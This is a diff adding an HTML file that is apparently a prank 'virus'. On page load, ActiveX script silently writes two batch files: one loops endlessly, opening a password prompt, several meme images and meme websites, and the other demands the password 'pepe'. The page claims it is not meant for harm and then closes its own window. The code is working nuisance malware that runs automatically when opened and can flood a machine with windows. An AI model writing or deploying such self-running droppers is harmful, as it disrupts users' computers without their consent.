@@ -1,0 +1,67 @@
+﻿<html>
+    <head>
+<h1><u>A Few things before you start...</h1></u>
+The only way to save yourself from the virus is to type "pepe" and then press enter really fast. <br>
+This program was not meant for harm, so don't use it as such
+        <script language="javascript">
+            function WriteToFile()
+            { 
+                var txt = new ActiveXObject("Scripting.FileSystemObject");
+                var s = txt.CreateTextFile("mains.bat", true);
+                s.WriteLine(':top');
+s.WriteLine('IF EXIST %USERPROFILE%\\Desktop\\MASTERFOLDER\\denied.txt (');
+s.WriteLine('ren %USERPROFILE%\\Desktop\\MASTERFOLDER\\ denied.txt passcheck.txt');
+s.WriteLine(')');
+s.WriteLine('IF EXIST %USERPROFILE%\\Desktop\\MASTERFOLDER\\passcheck.txt (');
+s.WriteLine('start %USERPROFILE%\\Desktop\\Password.bat');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\trippymeme.jpg');
+s.WriteLine('start "" https://www.google.com/search?q=dank+memes&safe=strict&espv=2&source=lnms&tbm=isch&sa=X&ved=0ahUKEwjDgqS2zsnRAhWKqlQKHZR4CqAQ_AUICCgB&biw=1440&bih=794');
+s.WriteLine('start "" https://memegenerator.net/');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\1.jpg');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\2.jpg');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\3.jpg');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\4.jpg');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\5.jpg');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\6.jpg');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\7.jpg');
+s.WriteLine('start %USERPROFILE%\\Desktop\\MASTERFOLDER\\img\\8.png');
+s.WriteLine('goto :top');
+s.WriteLine(') ELSE (');
+s.WriteLine('msg * I see you have cracked the code');
+s.WriteLine('pause');
+s.WriteLine(')');
+
+                s.Close();
+             }
+//nextline
+
+            { 
+                var txt = new ActiveXObject("Scripting.FileSystemObject");
+                var s = txt.CreateTextFile("Password.bat", true);
+s.WriteLine('@echo off');
+   s.WriteLine(':top');
+s.WriteLine('echo type the password:');
+s.WriteLine('set /p password=');
+s.WriteLine('if %password%==pepe goto :next ELSE FALSE goto :false');
+s.WriteLine('REM FALSE');
+s.WriteLine(':false');
+s.WriteLine('ren %USERPROFILE%\\Desktop\\MASTERFOLDER\\denied.txt" "passcheck.txt"');
+s.WriteLine('echo Incorrect...');
+s.WriteLine('goto :top');
+s.WriteLine('REM NEXT');
+s.WriteLine(':next');
+s.WriteLine('ren "%USERPROFILE%' + "\\" + 'Desktop' + "\\" + 'MASTERFOLDER' + "\\" + 'passcheck.txt" "denied.txt"');
+s.WriteLine('pause');
+s.WriteLine('exit');
+
+                s.Close();
+             }
+
+//Has Process Started?
+
+window.close();
+         </script>
+    </head>
+   <body onLoad="WriteToFile()">
+   </body>
+</html>
